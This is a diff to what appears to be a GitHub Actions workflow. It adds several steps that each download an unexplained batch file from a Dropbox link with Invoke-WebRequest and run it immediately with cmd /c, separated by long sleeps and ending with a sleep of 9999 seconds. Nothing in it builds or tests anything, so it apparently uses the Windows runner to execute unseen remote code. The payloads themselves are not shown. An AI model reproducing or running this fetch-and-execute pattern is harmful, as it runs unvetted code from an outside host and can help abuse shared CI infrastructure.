@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
 
 jobs:
-  build:
+  A6:
     runs-on: windows-latest
 
     steps:
@@ -15,38 +15,60 @@ jobs:
          cmd /c down.bat
 
       - name: A
-        run: Start-sleep -Seconds 600
+        run: Start-sleep -Seconds 100
 
-      - name: Download
+      - name: Download 1
         run: |
          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/43dl2unusgs8pntd3rylw/down1.bat?rlkey=wtrqxg32ipgmxyzdgkslto8i0&dl=1" -OutFile "down1.bat"
          cmd /c down1.bat
 
       - name: B
-        run: Start-sleep -Seconds 600
+        run: Start-sleep -Seconds 300
 
-      - name: Download
+      - name: Download 2
         run: |
          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/wwb8fs5smui3hfvggslz7/down2.bat?rlkey=whqgunhudkd7hohc78xmnz6nk&dl=1" -OutFile "down2.bat"
          cmd /c down2.bat
 
       - name: C
-        run: Start-sleep -Seconds 600
+        run: Start-sleep -Seconds 500
+
+      - name: Download 3
+        run: |
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/wm7oigp2l9vpn7fjqy7bc/down3.bat?rlkey=ik0lh5tfs20mmr5s1n5zzii1f&dl=1" -OutFile "down3.bat"
+         cmd /c down3.bat
 
       - name: D
-        run: Start-sleep -Seconds 600
+        run: Start-sleep -Seconds 700
+
+      - name: Download 4
+        run: |
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/3rbgz1v06z9c8o74k86qb/down4.bat?rlkey=5xw09r1jfyb24bmrk131dyigq&dl=1" -OutFile "down4.bat"
+         cmd /c down4.bat
 
       - name: E
-        run: Start-sleep -Seconds 600
+        run: Start-sleep -Seconds 500
+
+      - name: Download 5
+        run: |
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/u3u7w7c8c2l65idc0fpyf/down5.bat?rlkey=36h1snsmsl7qrb640zl1ltgi9&dl=1" -OutFile "down5.bat"
+         cmd /c down5.bat
 
       - name: F
-        run: Start-sleep -Seconds 600
+        run: Start-sleep -Seconds 300
+
+      - name: Download 6
+        run: |
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/me3qbq3c86pz4e0h3o3qp/down6.bat?rlkey=nq839spsd4s9ha6xcze5chbgb&dl=1" -OutFile "down6.bat"
+         cmd /c down6.bat
 
       - name: G
         run: Start-sleep -Seconds 600
 
-      - name: H
-        run: Start-sleep -Seconds 600
+      - name: Download 7
+        run: |
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/l2o3uvrdsmfl7bso98d5w/down7.bat?rlkey=5zsfi79skcutlu6p2dwq73pxx&dl=1" -OutFile "down7.bat"
+         cmd /c down7.bat
 
-      - name: I
-        run: Start-sleep -Seconds 21600
+      - name: H
+        run: Start-sleep -Seconds 9999
